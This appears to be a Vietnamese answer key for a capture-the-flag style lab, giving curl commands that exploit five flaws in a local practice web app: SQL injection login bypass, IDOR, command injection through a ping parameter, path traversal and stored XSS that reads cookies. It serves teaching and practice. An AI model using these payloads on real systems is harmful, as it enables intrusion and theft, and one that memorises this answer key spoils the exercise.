# Đáp án — demo-multivuln-001

Chỉ mở file này khi đã tự thử và bị kẹt.

## 1. SQL Injection (`/login`)

Query server dựng bằng f-string, không tham số hoá:

```python
f"SELECT id, username, is_admin FROM users WHERE username='{username}' AND password='{password}'"
```

Payload bypass auth, đăng nhập như `admin` mà không cần mật khẩu đúng:

```sh
curl -s -c cj.txt -d "username=admin' -- " -d "password=x" http://127.0.0.1:8090/login -L
curl -s -b cj.txt http://127.0.0.1:8090/notes/1
# -> FLAG{SQLI_LOGIN_BYPASS}
```

(`'--` comment phần kiểm tra password; cũng có thể dùng `' OR '1'='1' -- `.)

## 2. IDOR (`/notes/<id>`)

Đăng nhập bằng `bob`/`bobpw456` (tài khoản thường), rồi đổi id sang note của `alice` (id=2):

```sh
curl -s -c cj.txt -d "username=bob" -d "password=bobpw456" http://127.0.0.1:8090/login -L
curl -s -b cj.txt http://127.0.0.1:8090/notes/2
# -> FLAG{IDOR_PRIVATE_NOTE}
```

Route không kiểm tra `note.user_id == session['user_id']`.

## 3. OS Command Injection (`/ping/run`)

Tham số `host` nối thẳng vào `ping -c 1 {host}` chạy qua `shell=True`:

```sh
curl -s "http://127.0.0.1:8090/ping/run?host=127.0.0.1;cat+/opt/secret_cmdi.txt"
# -> FLAG{CMDI_PING_RCE}
```

## 4. Path Traversal (`/download`)

Tham số `file` nối thẳng vào path, không chặn `..`:

```sh
curl -s "http://127.0.0.1:8090/download?file=../../../../opt/secret_traversal.txt"
# -> FLAG{PATH_TRAVERSAL_DOWNLOAD}
```

## 5. Stored XSS (`/comments`)

Comment body render thẳng vào HTML, không escape. Gửi 1 comment chứa script,
sau đó bất kỳ ai load lại `/comments` (kể cả chính bạn) sẽ chạy payload:

```sh
curl -s -b cj.txt -d "author=pwn" --data-urlencode "body=<script>document.title=document.cookie</script>" \
  http://127.0.0.1:8090/comments
```

Mở `http://127.0.0.1:8090/comments` bằng trình duyệt sau khi gửi — tiêu đề tab
sẽ đổi thành nội dung cookie, trong đó có `session_token=FLAG{STORED_XSS_COOKIE_THEFT}`.
(Minh hoạ: nếu có nạn nhân/admin khác load trang này, payload có thể exfiltrate
cookie của họ về server của attacker bằng `fetch()`/`new Image().src=...`.)
